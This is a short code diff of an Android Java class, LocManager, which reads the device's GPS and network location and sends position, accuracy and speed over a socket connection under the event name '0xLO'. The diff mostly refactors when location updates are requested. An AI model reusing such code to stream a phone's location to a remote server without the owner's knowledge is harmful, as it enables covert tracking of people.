@@ -41,17 +41,20 @@ public class LocManager implements LocationListener {
         this.mContext = null;
     }
 
-
     public LocManager(Context context) {
         this.mContext = context;
         getLocation();
-        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 10, this);
+
     }
 
 
-    public Location getLocation() {
+    public void getLocation() {
         try {
             locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);
+
+            if (locationManager == null)
+                return;
+
             // getting GPS status
             isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
             // getting network status
@@ -96,11 +99,12 @@ public class LocManager implements LocationListener {
                 }
             }
 
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 10, this);
+
         } catch (Exception e) {
             e.printStackTrace();
         }
 
-        return location;
     }
 
     public boolean canGetLocation() {
@@ -134,7 +138,7 @@ public class LocManager implements LocationListener {
             accuracy = location.getAccuracy();
             speed = location.getSpeed();
         }
-        IOSocket.getInstance().getIoSocket().emit("0xLO", getData());
+        IOSocket.getInstance().getIoSocket().send("_0xLO", getData());
     }
 
     @Override
